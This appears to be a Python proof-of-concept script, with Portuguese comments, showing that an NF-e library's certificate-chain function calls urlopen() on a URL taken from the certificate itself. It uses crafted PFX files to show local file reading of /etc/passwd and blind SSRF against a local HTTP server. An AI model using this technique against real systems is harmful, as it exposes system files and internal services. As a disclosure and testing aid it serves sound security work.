"""PoC-1: config._generate_chain_pem_from_pfx faz urlopen() em URL vinda do
proprio certificado, sem allowlist de esquema -> file:// (leitura local) e
http:// interno (SSRF cego)."""
import threading, http.server, socketserver, urllib.request
from nfe.config import _generate_chain_pem_from_pfx
from pathlib import Path

hits = []
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        hits.append(self.path); self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers(); self.wfile.write(b"nao-e-um-certificado")
    def log_message(self, *a): pass
class S(socketserver.TCPServer):
    allow_reuse_address = True
srv = S(("127.0.0.1", 8899), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

# instrumenta urlopen para provar qual URL o codigo alcanca
real = urllib.request.urlopen
reached = []
def spy(url, *a, **k):
    reached.append(url); r = real(url, *a, **k)
    return r
urllib.request.urlopen = spy
import nfe.config as cfg; cfg.urlopen = spy

print("[*] pfx com AIA = file:///etc/passwd")
_generate_chain_pem_from_pfx(Path("aia-file.pfx"), "senha123")
print("    urlopen alcancado:", reached)
r = real("file:///etc/passwd"); print("    leitura local confirmada, 1a linha:", r.read().split(b"\n")[0])

reached.clear()
print("[*] pfx com AIA = http://127.0.0.1:8899/cadeia-interna")
_generate_chain_pem_from_pfx(Path("aia-http.pfx"), "senha123")
print("    urlopen alcancado:", reached)
print("    requisicoes recebidas pelo servidor interno:", hits)
srv.shutdown(); srv.server_close()
